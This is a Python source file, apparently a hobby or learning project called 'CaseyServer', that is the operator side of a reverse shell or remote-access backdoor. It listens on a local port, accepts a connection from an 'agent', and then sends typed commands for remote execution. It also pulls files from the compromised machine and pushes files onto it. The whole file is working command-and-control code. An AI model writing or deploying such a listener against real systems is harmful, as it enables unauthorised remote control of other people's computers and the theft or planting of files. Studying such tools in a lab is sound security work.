# CaseyServer

import socket, subprocess, os
import json


class Listener:
    # CONSTRUCTOR METHOD =====
    def __init__(self, ip, port):
        self.localSocket  = socket.socket()
        self.bufferSize   = 1024
        self.operatingSys = ""

        self.localSocket.bind((ip, port))
        self.localSocket.listen(0)
        print(f"[+] Listening for incoming connection on port {port}...")

        self.agentSocket, agentAddress = self.localSocket.accept()
        self.agentIP = agentAddress[0]
        print(f"[+] Connection established with {self.agentIP} on port {port}!")
    # END OF CONSTRUCTOR METHOD

    # SEND DATA =====
    def sendData(self, data):
        jsonData = json.dumps(data)

        self.agentSocket.send(jsonData.encode())
    # END OF sendData METHOD

    # RECEIVE DATA =====
    def recvData(self):
        jsonData = ""

        while (True):
            try:
                jsonData += self.agentSocket.recv(self.bufferSize).decode()

                return json.loads(jsonData)

            except ValueError:
                continue
    # END OF recvData METHOD

    # SEND FILE =====
    def sendFile(self, file_path):
        file     = open(file_path, "rb")
        fileSize = os.path.getsize(file_path)

        self.agentSocket.send(str(fileSize).encode())

        data = file.read()
        self.agentSocket.sendall(data)

        file.close()
        print("[+] Listener: File transfer complete")
    # END OF sendFile METHOD

    # RECEIVE FILE =====
    def recvFile(self, cmd_list): 
        destination = ""

        if (len(cmd_list) == 2):
            filePath = cmd_list[-1]
            if   (self.operatingSys == "Windows"): destination = filePath.split("\\")[-1]
            elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
        elif (len(cmd_list) == 3): destination = cmd_list[-1]

        fileSize   = self.agentSocket.recv(self.bufferSize).decode()
        file       = open(destination, "wb")
        fileBytes  = b""
        remainSize = int(fileSize)
        
        while (0 < remainSize):
            if (self.bufferSize <= remainSize):
                fileBytes += self.agentSocket.recv(self.bufferSize)
                remainSize -= self.bufferSize
            elif (remainSize < self.bufferSize):
                fileBytes  += self.agentSocket.recv(remainSize)
                remainSize -= remainSize
        
        file.write(fileBytes)
        file.close()
        print(f"[+] Listener: File successfully saved to {destination}")
    # END OF recvFile METHOD

    # EXECUTE =====
    def execute(self):
        try:
            banner = self.recvData()
            print(banner)

            if   ("Windows" in banner): self.operatingSys = "Windows"
            elif ("Unix" in banner):    self.operatingSys = "Unix"

            while (True):
                prompt = self.recvData()

                command = ""
                while (command == ""): command = input(prompt)
                cmdList = command.split()

                # Exit
                if (command.lower() == "exit"):
                    print("[+] Exiting the program\n")
                    self.sendData(command)
                    self.localSocket.close()
                    break

                # Other commands
                else:
                    self.sendData(command)

                    # Download file
                    if (cmdList[0].lower() == "download"):
                        self.recvFile(cmdList)
                        commandResult = self.recvData()
                        print(commandResult)

                    # Upload file
                    elif (cmdList[0].lower() == "upload"):
                        filePath = cmdList[1]

                        self.sendFile(filePath)
                        commandResult = self.recvData()
                        print(commandResult)
                    
                    # Other commands
                    else: 
                        commandResult = self.recvData()
                        print(commandResult)

        except KeyboardInterrupt:
            print("\n[+] Exiting the program\n")
            self.localSocket.close()

    # END OF execute METHOD
            

# BEGINNING OF MAIN =====

listener = Listener("127.0.0.1", 7399)
listener.execute()

# END OF MAIN =====